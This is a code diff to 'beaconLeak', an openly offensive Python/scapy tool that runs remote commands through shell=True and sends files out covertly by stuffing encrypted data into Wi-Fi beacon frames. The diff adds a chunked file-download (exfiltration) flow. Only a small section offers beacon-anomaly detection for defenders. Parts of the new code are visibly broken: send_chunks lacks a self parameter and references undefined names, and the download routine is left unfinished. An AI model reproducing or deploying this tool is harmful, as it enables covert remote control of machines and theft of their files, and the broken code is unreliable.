@@ -1,17 +1,19 @@
 #!/usr/bin/python
 #
-"""
+
+# beaconLeak - Covert data exfiltration and detection using beacon stuffing (🥓)
+banner = """
  _                       __            _
 | |_ ___ ___ ___ ___ ___|  |   ___ ___| |_
 | . | -_| .'|  _| . |   |  |__| -_| .'| '_|
 |___|___|__,|___|___|_|_|_____|___|__,|_,_|
-                        by cjcase [v0.8.90]
-
-beaconLeak - Covert data exfiltration and detection using beacon stuffing (🥓)
+                        by cjcase [v0.8.90]\n
 """
+
 import os
 import sys
 import time
+import math
 import shlex
 import syslog
 import hashlib
@@ -29,6 +31,7 @@ from scapy.all import sniff
 from scapy.all import sendp
 from scapy.all import srp1
 from scapy.all import hexdump
+from scapy.all import raw
 
 
 class beaconleak():
@@ -51,7 +54,7 @@ class beaconleak():
         self.shell_cmds = {
             '!help': 'print these commands',
             # TODO download file flow
-            #'!download': 'downloads file from target',
+            '!download': '<source path> <target path> : downloads file from target',
             #'!reset': 'resets own session and broadcasts session reset command',
             #'!upload': 'uploads file to target',
             '!': 'send command to target without waiting for response (e.g. !ls)',
@@ -78,6 +81,9 @@ class beaconleak():
             self.bssid = '00:14:bf:de:ad:c0'
         # TODO check beacon size and do covert element 221 stuffing
         self.marker = b'\x0b\x33'
+        # TODO download flow
+        self.max_size = 355
+        self.leak_frame = None
 
 
     def cmd(self, cmd):
@@ -87,22 +93,15 @@ class beaconleak():
         else:
             result = subprocess.check_output(cmd, shell=True)
         return result
+       
 
-
-    def stuff_bytes(self, file):
-        # called as victim, this will read a file, send its contents in the 
-        # beacon.
-        # TODO finish this dude.
-        file_size = None
-        with open(file, 'rb+') as f:
-            pass
-            
-
-    def beacon_craft(self, msg):
-        # general case
+    def beacon_craft(self, msg, eltid):
+        # TODO create frame ID class to have extensible ID usage
         # TODO add type/structure definition to class
-        _type = Dot11Elt(ID=253, info='\x01', len=1) # DEPRECATED: c2 type
-        _stuff = Dot11Elt(ID=254, info=msg, len=len(msg))
+        msg_e = self.box.encrypt(msg)
+        if self.debug:
+                print("[d] encrypted: {}".format(msg_e.hex()))
+        _stuff = Dot11Elt(ID=eltid, info=msg_e, len=len(msg_e))
         if not self.covert:
             rates = b'\x82\x84\x0b\x16'
             rsninfo = (
@@ -141,12 +140,10 @@ class beaconleak():
             if self.debug:
                 print("[d] command: {}".format(cmd))
             msg = cmd.encode()
-            msg_e = self.box.encrypt(msg)
-            if self.debug:
-                print("[d] encrypted: {}".format(msg_e.hex()))
-
+            
             # craft the frame
-            frame = self.beacon_craft(msg_e)
+            # TODO create frame ID class to have extensible ID usage
+            frame = self.beacon_craft(msg, 254)
 
             # TODO: optional bpf filtering
             # bpf = 'wlan addr2 %s' % bssid
@@ -190,7 +187,10 @@ class beaconleak():
                         cmd = cmd.split()
                         if cmd[0] == 'download':
                             # TODO download flow
-                            pass
+                            if len(cmd) != 3:
+                                print("[e] wrong arguments, expected 2, source path and destination path.")
+                                continue
+                            self.start_download(cmd[1], cmd[2])
                         elif cmd[0] == 'end':
                             print("\n[*] Done!")
                             break
@@ -203,6 +203,17 @@ class beaconleak():
                     if self.debug:
                         print(str(e))
                     continue
+
+    def start_download(self, src, dst):
+        # ask for file stats
+        if self.debug:
+            print(f"\t[*] Checking for file \"{src}\" stats in target")
+        req = self.beacon_craft(src.encode(), 222)
+        sendp(req, iface=self.iface, inter=0.100, verbose=int(self.debug))
+        # listen for chunks
+        # check missing
+        # ???
+        # profit!
 
 
     def response(self, frame):
@@ -241,6 +252,14 @@ class beaconleak():
         return c
 
 
+    def cut_frame(self, frame, cut):
+        t_frame = raw(frame)
+        n = len(frame[Dot11Elt][cut]) + 4
+        self.leak_frame = RadioTap(t_frame[:-n])
+        if self.debug:
+            print(f"[d] cut_frame at {cut}:\n{frame.command()}\n")
+
+
     def do_magic(self, frame, cut):
         if self.debug:
             print("[d] stuffed beacon at element in position {}:\n{}".format(cut, frame.command()))
@@ -264,6 +283,16 @@ class beaconleak():
             sendp(frame, iface=self.iface, verbose=int(self.debug))
 
 
+    def do_chunk_magic(self, element):
+        try:
+            msg = self.box.decrypt(element.info)
+            filename = self.box.decrypt(element.payload.info)
+            m_chunks = [int(x) for x in msg.split(b':')]
+            self.send_chunks(filename, m_chunks)
+        except Exception as e:
+            raise e
+            print("[e] check_missing failure: " + str(e))
+
     # TODO stuff element 221 for maximum lulz
     def magic(self, frame):
         if frame.haslayer(Dot11Beacon):
@@ -271,9 +300,17 @@ class beaconleak():
             i = 0
             elements = frame
             while elements:
-                if elements.ID == 128:
+                if elements.ID == 128: # ignore self
+                    break
+                if elements.ID == 222: # stat request
+                    self.cut_frame(frame, i)
+                    self.send_stat(elements.info)
+                if elements.ID == 224: # chunk request
+                    self.cut_frame(frame, i)
+                    self.do_chunk_magic(elements)
                     break
                 if elements.ID == 254:
+                    # TODO let do_magic ude the new frame cutting for response
                     self.do_magic(frame, i)
                     break
                 i = i + 1
@@ -349,6 +386,7 @@ class beaconleak():
 
     # this is for the blue teamers
     # IoC detection from simple test to complex test
+    # TODO: implement syslog functionality for IoCs
     def detect(self, frame):
         if frame.haslayer(Dot11Beacon):
             ssid = frame.info.decode('utf-8')
@@ -365,7 +403,7 @@ class beaconleak():
                 self.detected += 1
                 return
             # IoC: Beacon size sample std. dev.
-            l_tresh = 175 # these numbers were made with 
+            l_tresh = 174 # these numbers were made with 
             h_tresh = 352 # SCIENCE!
             l_frame = len(frame)
             if l_frame < l_tresh or l_frame > h_tresh:
@@ -385,7 +423,7 @@ class beaconleak():
 
     def check_iface(self):
         try:
-            sniff(iface=self.iface, count=1)
+            sniff(iface=self.iface, count=1, monitor=True)
         except OSError:
             print("[e] interface {i} not found, did you mean {i}mon?".format(i=self.iface))
             return False
@@ -394,15 +432,82 @@ class beaconleak():
         return True
 
 
+    # download flow
+    def stat_file(self, filename):
+        t_frame = self.leak_frame
+        try:
+            f = open(filename, 'rb')
+            file_size = f.seek(0, 2)
+            if(self.debug):
+                print(f"\t[i] file size: {file_size} octets")
+            approx = self.max_size - len(t_frame) - 84
+            magic = math.ceil(math.log10(file_size / approx) + 1) # sacrifice to the god of statistics
+            r_size = approx - magic
+            chunks = math.ceil(file_size / r_size)
+            if self.debug:
+                print(f"\t[i] beacons needed to send file: {chunks}")
+            f.close()
+            return (file_size, chunks, r_size)
+        except Exception as e:
+            if self.debug:
+                raise e
+            pass
+        
+
+
+    def stat_str(self, s):
+        t_frame = self.leak_frame 
+        s_bytes = s.encode('utf-8')
+        s_size = len(s_bytes)
+        approx = self.max_size - len(t_frame) - 84
+        magic = math.ceil(math.log10(s_size / approx) + 1) # sacrifice to the god of statistics
+        r_size = approx - magic
+        chunks = math.ceil(s_size / r_size)
+        if self.debug:
+            print(f"\t[i] beacons needed to send string: {chunks}")
+        return (s_size, chunks, r_size)
+
+
+    def send_stat(self, filename_c):
+        t_frame = self.leak_frame 
+        filename = self.box.decrypt(filename_c)
+        if self.debug:
+            print(f"[d] stat request for file: {filename.decode('utf-8')}")
+        file_size, chunks, r_size = self.stat_file(filename.decode('utf-8'))
+        if self.debug:
+            print(f"[d] Sending file stat frame for file {filename}...")
+        payload = f"{file_size}:{chunks}".encode('ascii')
+        payload_c = self.box.encrypt(payload)
+        _payload = Dot11Elt(ID=223, info=payload_c, len=len(payload_c))
+        tmp_frame = t_frame / _payload
+        sendp(tmp_frame, iface=self.iface, verbose=int(self.debug), realtime=True)
+
+
+    # niiice
+    def send_chunks(filename, chunk_list):
+        t_frame = self.leak_frame
+        file_size, chunks, r_size = stat_file(filename)
+        with open(filename, 'rb') as f:    
+            for seq in chunk_list:
+                m_seq = str(seq)
+                seq_c = box.encrypt(bytes(m_seq, 'ascii'))
+                _seq = Dot11Elt(ID=253, info=seq_c, len=len(seq_c))
+                chunk_offset = (r_size * seq)
+                f.seek(chunk_offset)
+                chunk = f.read(r_size)
+                chunk_c = box.encrypt(chunk)
+                _data = Dot11Elt(ID=254, info=chunk_c, len=len(chunk_c))
+                _frame = t_frame / _seq / _data
+                sendp(_frame, iface=self.iface, verbose=int(self.debug), realtime=True)
+                tell = f.tell()
+                if self.debug:
+                    print(f"\t[i] sent frame {seq} of {chunks}, data[{chunk_offset}:{tell}], frame size: {len(_frame)}")
+
+
+
 if __name__ == '__main__':
     import argparse
-    banner = """
-     _                       __            _
-    | |_ ___ ___ ___ ___ ___|  |   ___ ___| |_
-    | . | -_| .'|  _| . |   |  |__| -_| .'| '_|
-    |___|___|__,|___|___|_|_|_____|___|__,|_,_|
-                            by cjcase [v0.8.90]\n
-    """
+
     parse = argparse.ArgumentParser(add_help=True, formatter_class=argparse.RawTextHelpFormatter, description=banner)
     modes = parse.add_argument_group('modes')
     mutex = modes.add_mutually_exclusive_group(required=True)
